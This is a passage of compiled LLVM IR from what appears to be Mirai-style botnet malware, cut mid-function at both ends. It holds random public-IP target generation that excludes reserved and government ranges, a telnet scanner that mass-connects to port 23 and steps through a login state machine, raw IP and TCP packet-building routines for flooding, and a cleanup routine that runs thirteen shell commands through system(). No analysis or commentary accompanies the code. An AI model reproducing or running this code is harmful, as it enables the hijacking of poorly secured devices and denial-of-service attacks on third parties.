  %or.cond26 = and i1 %or.cond24, %36
  %37 = icmp eq i8 %27, -88
  %or.cond28 = and i1 %30, %37
  %or.cond39 = or i1 %or.cond28, %or.cond26
  br i1 %or.cond39, label %.critedge.backedge, label %38

; <label>:38:                                     ; preds = %34
  %39 = icmp eq i8 %25, -58
  %40 = and i8 %27, -2
  %switch = icmp eq i8 %40, 18
  %or.cond40 = and i1 %39, %switch
  br i1 %or.cond40, label %.critedge.backedge, label %41

; <label>:41:                                     ; preds = %38
  %42 = load i8, i8* @getRandomPublicIP.ipState.0, align 1
  %43 = icmp eq i8 %42, -58
  %44 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %45 = icmp eq i8 %44, 51
  %or.cond30 = and i1 %43, %45
  %46 = load i8, i8* @getRandomPublicIP.ipState.2, align 1
  %47 = icmp eq i8 %46, 100
  %or.cond32 = and i1 %or.cond30, %47
  br i1 %or.cond32, label %.critedge.backedge, label %48

; <label>:48:                                     ; preds = %41
  %49 = icmp eq i8 %42, -53
  %50 = icmp eq i8 %44, 0
  %or.cond34 = and i1 %49, %50
  %51 = icmp eq i8 %46, 113
  %or.cond36 = and i1 %or.cond34, %51
  %52 = icmp ugt i8 %42, -33
  %or.cond38 = or i1 %52, %or.cond36
  br i1 %or.cond38, label %.critedge.backedge, label %53

; <label>:53:                                     ; preds = %48
  %54 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %54, i8 0, i64 16, i32 16, i1 false)
  %55 = load i8, i8* @getRandomPublicIP.ipState.0, align 1
  %56 = zext i8 %55 to i32
  %57 = load i8, i8* @getRandomPublicIP.ipState.1, align 1
  %58 = zext i8 %57 to i32
  %59 = load i8, i8* @getRandomPublicIP.ipState.2, align 1
  %60 = zext i8 %59 to i32
  %61 = load i8, i8* @getRandomPublicIP.ipState.3, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %54, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.487, i64 0, i64 0), i32 %56, i32 %58, i32 %60, i32 %62)
  %64 = call i32 @inet_addr(i8* nonnull %54) #7
  ret i32 %64
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @MiraiIPRanges() local_unnamed_addr #2 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #7
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* @MiraiIPRanges.ipState.0, align 1
  %5 = tail call i32 @rand() #7
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* @MiraiIPRanges.ipState.1, align 1
  %8 = tail call i32 @rand() #7
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* @MiraiIPRanges.ipState.2, align 1
  %11 = tail call i32 @rand() #7
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* @MiraiIPRanges.ipState.3, align 1
  %14 = load i8, i8* @MiraiIPRanges.ipState.0, align 1
  switch i8 %14, label %18 [
    i8 127, label %.critedge.backedge
    i8 0, label %.critedge.backedge
    i8 3, label %.critedge.backedge
    i8 15, label %.critedge.backedge
    i8 16, label %.critedge.backedge
    i8 56, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 -64, label %15
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %15, %21, %28, %31, %40, %40, %40, %40, %40, %40, %40, %40, %40, %40, %40, %40, %40, %40, %36
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = load i8, i8* @MiraiIPRanges.ipState.1, align 1
  %17 = icmp eq i8 %16, -88
  br i1 %17, label %.critedge.backedge, label %thread-pre-split35

thread-pre-split35:                               ; preds = %15
  %.pr36 = load i8, i8* @MiraiIPRanges.ipState.0, align 1
  br label %18

; <label>:18:                                     ; preds = %thread-pre-split35, %.critedge
  %19 = phi i8 [ %.pr36, %thread-pre-split35 ], [ %14, %.critedge ]
  %20 = icmp eq i8 %19, -84
  br i1 %20, label %21, label %25

; <label>:21:                                     ; preds = %18
  %22 = load i8, i8* @MiraiIPRanges.ipState.1, align 1
  %23 = and i8 %22, -16
  %24 = icmp eq i8 %23, 16
  br i1 %24, label %.critedge.backedge, label %thread-pre-split

thread-pre-split:                                 ; preds = %21
  %.pr = load i8, i8* @MiraiIPRanges.ipState.0, align 1
  br label %25

; <label>:25:                                     ; preds = %thread-pre-split, %18
  %26 = phi i8 [ %.pr, %thread-pre-split ], [ %19, %18 ]
  %27 = icmp eq i8 %26, 100
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %25
  %29 = load i8, i8* @MiraiIPRanges.ipState.1, align 1
  %.off = add i8 %29, -64
  %30 = icmp ult i8 %.off, 63
  br i1 %30, label %.critedge.backedge, label %31

; <label>:31:                                     ; preds = %28, %25
  %32 = load i8, i8* @MiraiIPRanges.ipState.0, align 1
  %33 = icmp eq i8 %32, -87
  %34 = load i8, i8* @MiraiIPRanges.ipState.1, align 1
  %35 = icmp eq i8 %34, -1
  %or.cond31 = and i1 %33, %35
  br i1 %or.cond31, label %.critedge.backedge, label %36

; <label>:36:                                     ; preds = %31
  %37 = icmp eq i8 %32, -58
  %38 = and i8 %34, -2
  %39 = icmp eq i8 %38, 18
  %or.cond = and i1 %37, %39
  br i1 %or.cond, label %.critedge.backedge, label %40

; <label>:40:                                     ; preds = %36
  %41 = load i8, i8* @MiraiIPRanges.ipState.0, align 1
  switch i8 %41, label %42 [
    i8 -32, label %.critedge.backedge
    i8 6, label %.critedge.backedge
    i8 7, label %.critedge.backedge
    i8 11, label %.critedge.backedge
    i8 21, label %.critedge.backedge
    i8 22, label %.critedge.backedge
    i8 26, label %.critedge.backedge
    i8 28, label %.critedge.backedge
    i8 29, label %.critedge.backedge
    i8 30, label %.critedge.backedge
    i8 33, label %.critedge.backedge
    i8 55, label %.critedge.backedge
    i8 -42, label %.critedge.backedge
    i8 -41, label %.critedge.backedge
  ]

; <label>:42:                                     ; preds = %40
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %43, i8 0, i64 16, i32 16, i1 false)
  %44 = load i8, i8* @MiraiIPRanges.ipState.0, align 1
  %45 = zext i8 %44 to i32
  %46 = load i8, i8* @MiraiIPRanges.ipState.1, align 1
  %47 = zext i8 %46 to i32
  %48 = load i8, i8* @MiraiIPRanges.ipState.2, align 1
  %49 = zext i8 %48 to i32
  %50 = load i8, i8* @MiraiIPRanges.ipState.3, align 1
  %51 = zext i8 %50 to i32
  %52 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %43, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.487, i64 0, i64 0), i32 %45, i32 %47, i32 %49, i32 %51)
  %53 = call i32 @inet_addr(i8* nonnull %43) #7
  ret i32 %53
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #2 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #15
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !4

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #2 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #15
  %10 = tail call noalias i8* @malloc(i64 44) #7
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #7
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #1 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #2 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #7
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() local_unnamed_addr #2 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.488, i64 0, i64 0)) #7
  %2 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.489, i64 0, i64 0)) #7
  %3 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.490, i64 0, i64 0)) #7
  %4 = tail call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.491, i64 0, i64 0)) #7
  %5 = tail call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.492, i64 0, i64 0)) #7
  %6 = tail call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.493, i64 0, i64 0)) #7
  %7 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.494, i64 0, i64 0)) #7
  %8 = tail call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.495, i64 0, i64 0)) #7
  %9 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.496, i64 0, i64 0)) #7
  %10 = tail call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.497, i64 0, i64 0)) #7
  %11 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.498, i64 0, i64 0)) #7
  %12 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.499, i64 0, i64 0)) #7
  %13 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.500, i64 0, i64 0)) #7
  ret void
}

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define void @TelnetScanner(i32, i32) local_unnamed_addr #11 {
  %3 = alloca %struct.fd_set, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca [80 x i8], align 16
  %9 = alloca [80 x i8], align 16
  %10 = tail call i32 @getdtablesize() #7
  %11 = add nsw i32 %10, -100
  %12 = icmp sgt i32 %11, %1
  %. = select i1 %12, i32 %1, i32 %11
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 23) #15
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %17 = bitcast i8* %16 to i64*
  store i64 0, i64* %17, align 4
  %18 = tail call noalias i8* @malloc(i64 1025) #7
  tail call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 1025, i32 1, i1 false)
  %19 = zext i32 %. to i64
  %20 = alloca %struct.telstate_t, i64 %19, align 16
  %21 = bitcast %struct.telstate_t* %20 to i8*
  %22 = sext i32 %. to i64
  %23 = mul nsw i64 %22, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 %23, i32 16, i1 false)
  %24 = icmp sgt i32 %., 0
  br i1 %24, label %.lr.ph127.preheader, label %.preheader

.lr.ph127.preheader:                              ; preds = %2
  %25 = sext i32 %. to i64
  %xtraiter = and i64 %25, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph127.prol.loopexit, label %.lr.ph127.prol.preheader

.lr.ph127.prol.preheader:                         ; preds = %.lr.ph127.preheader
  br label %.lr.ph127.prol

.lr.ph127.prol:                                   ; preds = %.lr.ph127.prol.preheader
  %26 = bitcast %struct.telstate_t* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %26, i8 0, i64 32, i32 16, i1 false)
  %27 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 0, i32 3
  store i8 1, i8* %27, align 1
  %28 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 0, i32 9
  store i8* %18, i8** %28, align 8
  br label %.lr.ph127.prol.loopexit

.lr.ph127.prol.loopexit:                          ; preds = %.lr.ph127.preheader, %.lr.ph127.prol
  %indvars.iv.unr = phi i64 [ 0, %.lr.ph127.preheader ], [ 1, %.lr.ph127.prol ]
  %29 = icmp eq i32 %., 1
  br i1 %29, label %.preheader.loopexit, label %.lr.ph127.preheader.new

.lr.ph127.preheader.new:                          ; preds = %.lr.ph127.prol.loopexit
  br label %.lr.ph127

.preheader.loopexit.unr-lcssa:                    ; preds = %.lr.ph127
  br label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %.lr.ph127.prol.loopexit, %.preheader.loopexit.unr-lcssa
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %2
  %30 = icmp sgt i32 %., 0
  %31 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  %34 = getelementptr inbounds [80 x i8], [80 x i8]* %8, i64 0, i64 0
  br label %.loopexit

.lr.ph127:                                        ; preds = %.lr.ph127, %.lr.ph127.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph127.preheader.new ], [ %indvars.iv.next.1, %.lr.ph127 ]
  %35 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv
  %36 = bitcast %struct.telstate_t* %35 to i8*
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 32, i32 16, i1 false)
  %37 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv, i32 3
  store i8 1, i8* %37, align 1
  %38 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv, i32 9
  store i8* %18, i8** %38, align 8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next
  %40 = bitcast %struct.telstate_t* %39 to i8*
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 32, i32 16, i1 false)
  %41 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next, i32 3
  store i8 1, i8* %41, align 1
  %42 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next, i32 9
  store i8* %18, i8** %42, align 8
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %43 = icmp slt i64 %indvars.iv.next.1, %25
  br i1 %43, label %.lr.ph127, label %.preheader.loopexit.unr-lcssa

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %30, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %45 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 0
  %46 = sext i32 %0 to i64
  %47 = bitcast i32* %6 to i8*
  %48 = getelementptr inbounds [80 x i8], [80 x i8]* %9, i64 0, i64 0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %379
  %.1125 = phi i32 [ %.mux, %379 ], [ 0, %.lr.ph.preheader ]
  %49 = sext i32 %.1125 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 7
  %52 = load i32, i32* %51, align 16
  %53 = icmp eq i32 %52, 0
  br i1 %53, label %54, label %57

; <label>:54:                                     ; preds = %.lr.ph
  %55 = call i64 @time(i64* null) #7
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %51, align 16
  br label %57

; <label>:57:                                     ; preds = %54, %.lr.ph
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 2
  %59 = load i8, i8* %58, align 8
  switch i8 %59, label %379 [
    i8 0, label %60
    i8 1, label %102
    i8 2, label %136
    i8 3, label %158
    i8 4, label %176
    i8 5, label %198
    i8 6, label %216
    i8 7, label %261
    i8 8, label %301
  ]

; <label>:60:                                     ; preds = %57
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 3
  %62 = load i8, i8* %61, align 1
  switch i8 %62, label %83 [
    i8 1, label %63
    i8 0, label %70
  ]

; <label>:63:                                     ; preds = %60
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 9
  %65 = bitcast i8** %64 to i64*
  %66 = load i64, i64* %65, align 8
  %67 = bitcast %struct.telstate_t* %50 to i8*
  call void @llvm.memset.p0i8.i64(i8* %67, i8 0, i64 32, i32 16, i1 false)
  store i64 %66, i64* %65, align 8
  %68 = call i32 @getRandomPublicIP()
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 1
  store i32 %68, i32* %69, align 4
  br label %83

; <label>:70:                                     ; preds = %60
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 4
  %72 = load i8, i8* %71, align 2
  %73 = add i8 %72, 1
  store i8 %73, i8* %71, align 2
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 5
  %75 = load i8, i8* %74, align 1
  %76 = add i8 %75, 1
  store i8 %76, i8* %74, align 1
  %77 = icmp eq i8 %76, 35
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %70
  store i8 1, i8* %61, align 1
  br label %379

; <label>:79:                                     ; preds = %70
  %80 = load i8, i8* %71, align 2
  %81 = icmp eq i8 %80, 35
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %79
  store i8 1, i8* %61, align 1
  br label %379

; <label>:83:                                     ; preds = %60, %79, %63
  store i16 2, i16* %13, align 4
  store i16 %14, i16* %15, align 2
  store i64 0, i64* %17, align 4
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 1
  %85 = load i32, i32* %84, align 4
  store i32 %85, i32* %44, align 4
  %86 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  store i32 %86, i32* %87, align 16
  %88 = icmp eq i32 %86, -1
  br i1 %88, label %379, label %89

; <label>:89:                                     ; preds = %83
  %90 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i8* null) #7
  %91 = or i32 %90, 2048
  %92 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 4, i32 %91) #7
  %93 = load i32, i32* %87, align 16
  %94 = call i32 @connect(i32 %93, %struct.sockaddr* nonnull %31, i32 16) #7
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %101

; <label>:96:                                     ; preds = %89
  %97 = tail call i32* @__errno_location() #15
  %98 = load i32, i32* %97, align 4
  %99 = icmp eq i32 %98, 115
  br i1 %99, label %101, label %100

; <label>:100:                                    ; preds = %96
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:101:                                    ; preds = %96, %89
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 1)
  br label %379

; <label>:102:                                    ; preds = %57
  %103 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %45) #7, !srcloc !6
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
